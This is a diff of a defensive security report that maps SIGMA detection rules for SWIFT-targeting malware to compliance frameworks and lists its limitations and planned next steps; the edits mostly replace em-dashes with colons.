-| 7, 8 | **6.2 Software Integrity** (daily-cadence requirement would likely miss a same-day swap-and-revert) | — | EXP-SYS-CONFIG / EXP-SYS-DURC | A.8.32 |
+| 1 | **6.2 Software Integrity** : in-memory integrity checking is listed only as an *Optional Enhancement*, not mandatory. **6.5A Intrusion Detection.** | Testing-methodology alignment (grey-box scope, Art. 10) | EXP-JOURN/SURV-CENTR | A.8.16 |
+| 2 | **6.4 Logging and Monitoring** : explicitly names "command-line history for privileged operating system accounts" as a *minimum required log* | : | EXP-JOURN/SURV-PRIVIL (nominative privileged accounts) | A.8.15 |
+| 3 | **6.3 Database Integrity** : "searches for any unexpectedly deleted records" is also only an *Optional Enhancement* | : | EXP-JOURN/SURV-JOURNAL | A.8.16 |
+| 4 | **2.9 Transaction Business Controls** : explicitly names monitoring "exceptionally high amounts" and sequential-numbering gaps as required measures | : | No direct equivalent : DNSSI is a general baseline, not transaction-specific | A.8.16 |
+| 6 | No explicit filesystem-level anti-forensic control identified in CSCF at all | Aligned with expected pentest scope (Art. 1, 2) | **INCID-GEST-PREUV** : evidence-preservation/chain-of-custody requirement, directly on point | A.5.28 |
+| 7, 8 | **6.2 Software Integrity** (daily-cadence requirement would likely miss a same-day swap-and-revert) | : | EXP-SYS-CONFIG / EXP-SYS-DURC | A.8.32 |
 
 **Two findings worth emphasizing:**
 
@@ -1461,7 +1460,7 @@ The detection content above is mapped against four frameworks relevant to a fina
 
 2. **Neither CSCF nor DNSSI has an explicit control for filesystem-level anti-forensic techniques.** DNSSI's evidence-preservation requirement (INCID-GEST-PREUV) is the closest applicable control, but it's framed as a post-incident forensic obligation, not a preventive/detective control. Rule 6 fills a real, specific gap in current framework coverage.
 
-> [SCHEMA: A simple visual matrix — rows = rules, columns = the 4 frameworks, colored green/yellow/red for direct match / partial match / no coverage. This is a strong LinkedIn visual.]
+> [SCHEMA: A simple visual matrix : rows = rules, columns = the 4 frameworks, colored green/yellow/red for direct match / partial match / no coverage. This is a strong LinkedIn visual.]
 
 ---
 
@@ -1471,22 +1470,22 @@ Stated plainly, not buried:
 
 - **No real Alliance Access.** The validation environment simulates the environment class Alliance Access operates within; it does not include the proprietary application itself, which cannot legally be obtained outside SWIFT membership.
 - **False-positive rates are not empirically measured** against production SWIFT-environment traffic, which was not accessible for this project. FP estimates reflect general security-engineering practice, not lab-measured data.
-- **Rule 1's GrantedAccess exact-match logic is brittle** — a known limitation of Sysmon ProcessAccess-based detection generally, not unique to this rule.
-- **SIGMA correlation-rule backend support is immature** — Rule 6's Kusto conversion failure reflects current tooling maturity and may not persist as the ecosystem develops.
-- **The `mcf\` directory's full function is not completely characterized** in this analysis — flagged as an open question.
+- **Rule 1's GrantedAccess exact-match logic is brittle** : a known limitation of Sysmon ProcessAccess-based detection generally, not unique to this rule.
+- **SIGMA correlation-rule backend support is immature** : Rule 6's Kusto conversion failure reflects current tooling maturity and may not persist as the ecosystem develops.
+- **The `mcf\` directory's full function is not completely characterized** in this analysis : flagged as an open question.
 - **This report has not undergone formal peer review** at the time of publication; a separate, peer-review-track academic version of this work exists as a companion paper (Section 0).
 
 ---
 
 ## 12. What's Next
 
-- **Formal SigmaHQ submission** — several of these rules (particularly Rule 1 and Rule 6, the two most generalizable behaviors) are strong candidates for submission to the official SigmaHQ public rule repository, following their contribution conventions and providing the real Sysmon telemetry captured here as test evidence.
-- **Sysmon FileDelete crash — GitHub issue.** The bug documented in Section 8.3 should be reported to the Sysinternals/Sysmon repository as a stability regression, with the isolated minimal reproduction case, separate from any security-vulnerability framing (this is a crash/DoS finding, not a confirmed exploitable memory-corruption bug).
-- **NESTEGG backdoor rule set** — the DOJ complaint documents a fourth malware component (the NESTEGG backdoor: scheduled task → MD5-keyed payload decrypt → firewall modification → listening service) not covered by this rule set; a future extension should build emulators and rules for this install chain.
-- **Full characterization of the `mcf\` directory's role** — an open question flagged in Section 8.
+- **Formal SigmaHQ submission** : several of these rules (particularly Rule 1 and Rule 6, the two most generalizable behaviors) are strong candidates for submission to the official SigmaHQ public rule repository, following their contribution conventions and providing the real Sysmon telemetry captured here as test evidence.
+- **Sysmon FileDelete crash : GitHub issue.** The bug documented in Section 8.3 should be reported to the Sysinternals/Sysmon repository as a stability regression, with the isolated minimal reproduction case, separate from any security-vulnerability framing (this is a crash/DoS finding, not a confirmed exploitable memory-corruption bug).
+- **NESTEGG backdoor rule set** : the DOJ complaint documents a fourth malware component (the NESTEGG backdoor: scheduled task → MD5-keyed payload decrypt → firewall modification → listening service) not covered by this rule set; a future extension should build emulators and rules for this install chain.
+- **Full characterization of the `mcf\` directory's role** : an open question flagged in Section 8.
 - **Empirical false-positive testing** against a live SIEM (Wazuh or an authorized SentinelOne EDR instance) ingesting the same telemetry, rather than the offline log-matching validation used here.
 - **Academic peer review** of the companion paper, targeting a Scopus-indexed Q1 venue in the digital forensics/security-applications space.
 
 ---
 
-*If you found this useful, the full rule set, lab configuration files, and emulator scripts are available at [GitHub link]. Corrections, especially to the reverse-engineering findings in Sections 3-4, are welcome — open an issue.*
+*If you found this useful, the full rule set, lab configuration files, and emulator scripts are available at [GitHub link]. Corrections, especially to the reverse-engineering findings in Sections 3-4, are welcome : open an issue.*
